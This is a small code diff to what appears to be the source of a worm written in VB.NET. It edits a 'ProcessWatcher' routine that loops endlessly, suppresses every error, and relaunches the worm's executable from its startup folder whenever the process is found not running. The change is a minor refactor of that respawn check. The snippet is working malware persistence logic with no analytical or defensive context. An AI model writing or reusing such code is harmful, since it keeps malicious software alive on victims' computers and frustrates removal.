@@ -10,9 +10,7 @@ Public Class ProcessWatcher
     Private Sub WatcherDeamon(x As Boolean)
         On Error Resume Next
         Do While x = True
-            If Process.GetProcessesByName(GetWorm()).Length > 0 Then
-
-            Else
+            If Not Process.GetProcessesByName(GetWorm()).Length > 0 Then
                 System.Threading.Thread.Sleep(2500)
                 Process.Start(Application.StartupPath & "\" & GetWorm() & ".exe")
             End If
